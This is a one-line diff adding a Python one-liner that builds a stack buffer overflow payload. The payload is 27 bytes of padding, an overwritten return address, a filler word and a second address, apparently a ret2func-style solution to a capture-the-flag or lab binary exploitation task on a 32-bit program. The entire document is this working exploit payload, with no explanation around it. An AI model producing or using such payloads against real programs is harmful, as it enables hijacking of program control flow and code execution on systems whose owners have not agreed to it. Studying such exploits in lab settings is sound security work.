@@ -1,0 +1,1 @@
+python -c "import struct;print 'A'*27 + struct.pack('<I',0x80486bd) + 'AAAA' + struct.pack('<I',0x80487d0)"
